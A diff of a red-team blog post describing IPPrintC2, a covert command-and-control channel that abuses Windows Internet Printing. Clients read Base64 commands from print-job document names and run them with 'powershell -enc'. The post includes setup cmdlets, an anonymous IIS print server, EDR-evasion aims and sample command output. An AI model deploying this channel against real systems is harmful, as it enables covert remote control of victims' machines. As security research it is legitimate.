@@ -2,20 +2,23 @@
 layout: post
 title: "Your printer has a new job"
 date: 2026-04-06 11:57 +0200
-description: "Windows Printers abuse for Command and Control"
+description: "IPPrintC2: abusing Windows printers and the Internet Printing Protocol (IPP) as a covert command and control (C2) channel, with command execution via print job document names"
 categories: [Research, C2]
-tags: [C2, IPPrintC2, "Command and Control"]
+tags: [C2, IPPrintC2, red-team, windows, printing]
+image:
+  path: /assets/img/2/printer-c2.webp
+  alt: "IPPrintC2 - Windows printer used as a C2 channel"
 ---
 
-# Intro
+## Intro
 Hello my fellow toner cartridge replacers! The day has come to get some revenge on printers for all the drum kit replacements and document feeder cleanings. In this blog post I will cover research I did during 2021. While the [original](https://www.diverto.hr/en/blog/2024-05-03-MS-Windows-Printing-C2/) blog post is well written, it misses a story behind it.
 
 After finally putting my brain at rest during summer holidays in 2021, it soon got bored and missed the adrenaline rushes. I felt that I needed to create something by myself and "give something back" no matter how horrible it was. Regardless of how many certificate badges I collected or how well I did my pentest / Red teaming engagements, I was still reliant on tools and scripts that someone else made and I wanted to change this.
 
 Obtaining initial access via the usual C2 frameworks was not as straight-forward as before. So I thought - can I make my own C2? What could I use? Most of the [LOLBAS](https://lolbas-project.github.io) were triggering EDRs, so I needed something different. And then printers came to my mind, because all the organizations are using them and everyone has one installed. Even if someone does not - could I install one for them? If I managed to install a printer, what would I do with it? So I decided to start and figure it out along the way.
 
-# From Idea to C2 
-During my working days as a help-desk technician and a system administrator I would install the printers with Batch scripts or manually via the Add Printer dialog by using an AD-published printer or via TCP / HTTP / share name: ![Add Printer Dialog](/assets/img/2/add-printer-dialog.png) But a lot has changed since then. PowerShell became a go-to-for-everything, especially for offensive security. Therefore, I researched a bit and found out that you can install a printer via the [Add-Printer](https://learn.microsoft.com/en-us/powershell/module/printmanagement/add-printer?view=windowsserver2025-ps) cmdlet. 
+## From Idea to C2 
+During my working days as a help-desk technician and a system administrator I would install the printers with Batch scripts or manually via the Add Printer dialog by using an AD-published printer or via TCP / HTTP / share name: ![Add Printer Dialog](/assets/img/2/add-printer-dialog.webp) But a lot has changed since then. PowerShell became a go-to-for-everything, especially for offensive security. Therefore, I researched a bit and found out that you can install a printer via the [Add-Printer](https://learn.microsoft.com/en-us/powershell/module/printmanagement/add-printer?view=windowsserver2025-ps) cmdlet. 
 ```powershell
 Add-Printer
     [-ConnectionName] <String>
@@ -27,7 +30,7 @@ Add-Printer
     [<CommonParameters>]
 ```
 So, by using the `Add-Printer` cmdlet I can install a remote printer by providing a valid URI. The communication in the background uses [Internet Printing Protocol](https://datatracker.ietf.org/doc/html/rfc8011) and we can use HTTPS, which I've heard is something of importance. 
-But what printer? Do I need to buy an actual printing device and publish it on the Internet? ![You can be whatever you want my dear printer](/assets/img/2/printer-c2.png)
+But what printer? Do I need to buy an actual printing device and publish it on the Internet? ![You can be whatever you want my dear printer](/assets/img/2/printer-c2.webp)
 
 Well, it turned out that I don't. You can create a Printer Port via [Add-PrinterPort](https://learn.microsoft.com/en-us/powershell/module/printmanagement/add-printerport?view=windowsserver2025-ps) which will be used to store output received from clients, and create a printer object with `Add-Printer` that uses the created Printer Port. To allow other users to use it, it needs to be `-Shared` and we need to keep the printed jobs in the print queue with `-KeepPrintedJobs`, which I will explain later. So, I spun up a VM in Azure that will be used as a C2 server and created a printer object:
 
@@ -39,13 +42,13 @@ New-Item $C2output
 Add-Printer -Name $PrinterName -DriverName "Generic / Text Only" -KeepPrintedJobs -Shared -ShareName $PrinterName -PortName $C2output
 ```
 
-As for the driver in the `-DriverName` parameter, we need to use pre-installed Microsoft Windows drivers, as driver installation requires admin privileges and most users that we will be targeting do not have admin privileges. Here is a list of pre-installed printer drivers on Windows 10: ![Pre-installed Windows Printer Drivers](/assets/img/2/windows-printer-drivers.png)
+As for the driver in the `-DriverName` parameter, we need to use pre-installed Microsoft Windows drivers, as driver installation requires admin privileges and most users that we will be targeting do not have admin privileges. Here is a list of pre-installed printer drivers on Windows 10: ![Pre-installed Windows Printer Drivers](/assets/img/2/windows-printer-drivers.webp)
 
-Great, so now I have a fake printer. Now I need to actually expose it to the Internet. Luckily, my previous sysadmin days were helpful once again and I remembered the [Internet Printing Service](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj134159(v=ws.11)). For this feature to work as needed I had to install Internet Information Services, Windows Print Services, Print Server, and Internet Printing on the C2 server. Once that was set-up, I was not able to access the Internet Printing Service from the Internet, as it required authentication. So I decided to configure IIS with anonymous authentication enabled. Once I had set that up, the printer was now Internet-accessible without authentication: ![Windows Internet Printing](/assets/img/2/windows-internet-printing-service.png)
+Great, so now I have a fake printer. Now I need to actually expose it to the Internet. Luckily, my previous sysadmin days were helpful once again and I remembered the [Internet Printing Service](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj134159(v=ws.11)). For this feature to work as needed I had to install Internet Information Services, Windows Print Services, Print Server, and Internet Printing on the C2 server. Once that was set-up, I was not able to access the Internet Printing Service from the Internet, as it required authentication. So I decided to configure IIS with anonymous authentication enabled. Once I had set that up, the printer was now Internet-accessible without authentication: ![Windows Internet Printing](/assets/img/2/windows-internet-printing-service.webp)
 
 So the scaffolding is in place. At this point I had a printer on the Internet that did absolutely nothing. Now we need to actually execute commands on the clients. I wasn't quite sure how I would accomplish this and I looked at various printer properties that can be manipulated from our C2, but also visible on the client side. 
 
-If you have used printers, you know that when you print something - a print job can be seen in the printer queue. By default, you cannot see other people's print jobs when you look at your printer queue - only yours. When I was testing this setup and added the Internet-published printer to my Windows VM and printed something on it - I saw that the owner of the print job was the IUSR account. To quote: _IUSR is a built-in, password-less local account in IIS 7 and later, serving as the default identity for anonymous web requests_ ![Document name and owner of the job](/assets/img/2/ipprintc2-document-name-ipconfig.png)
+If you have used printers, you know that when you print something - a print job can be seen in the printer queue. By default, you cannot see other people's print jobs when you look at your printer queue - only yours. When I was testing this setup and added the Internet-published printer to my Windows VM and printed something on it - I saw that the owner of the print job was the IUSR account. To quote: _IUSR is a built-in, password-less local account in IIS 7 and later, serving as the default identity for anonymous web requests_ ![Document name and owner of the job](/assets/img/2/ipprintc2-document-name-ipconfig.webp)
 
 When I printed from the C2 server directly to the printer object, the owner of the print job was my logged-in user - not the IUSR account. I realized that the critical detail in the setup is: the C2 server must also use the Internet-published shared printer to submit jobs to the print queue, so that the print job ownership from the C2 server is also attributed to IUSR user account. With that setup, the targeted client machines will see the documents in the printer queue sent by the C2 server, as they both (the clients and the C2 server) use the IUSR account.
 
@@ -53,7 +56,7 @@ Finally I resolved all the issues and could focus on command execution. I opted 
 
 OK, what's next? Now I actually need to execute this command on the client. Welcome [Get-PrintJob](https://learn.microsoft.com/en-us/powershell/module/printmanagement/get-printjob?view=windowsserver2025-ps), a PowerShell cmdlet that allows you to retrieve a list of print jobs for the specified printer. For example `(Get-PrintJob XPS).DocumentName` will obtain the document name from the printer named `XPS`, and in our case that document name will be `aXBjb25maWcgL2FsbAo=`. Pass that to the `powershell -enc` and you will execute that Base64-encoded command.
 
-![Command execution on the client](/assets/img/2/ipprintc2-command-exec-via-document-name.png)
+![Command execution on the client](/assets/img/2/ipprintc2-command-exec-via-document-name.webp)
 
 I was very happy. But I still had some obstacles: 
 - while I have command execution, the C2 operator does not receive any command output
@@ -202,7 +205,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 DESKTOP-PRINTINGFUN
 ```
 
-# Detection and Outro
+## Detection and Outro
 Nothing is perfect, and this C2 is a text-book example. After this C2 was published it was never used again, nor maintained. It served its purpose. Also, it works as one-to-all — every client connected to the same printer receives the same commands. If you are insane enough to use this in a real engagement and need per-target control, set up additional printers and run multiple instances of IPPrintC2.ps1. Want binary exfiltration? How about no. Only works with ASCII text-based files. 
 
 IIS is exposed with anonymous authentication. With document names as commands in Base64. You really need to use the whitelist approach for network segments you are targeting. Use SSL to encrypt the IPP traffic unless you want to share your tasking with everyone on the wire. I also had a better name for this C2 - PrintC2, but WithSecure had published a blogpost where they used printers for lateral movement, and used that name.
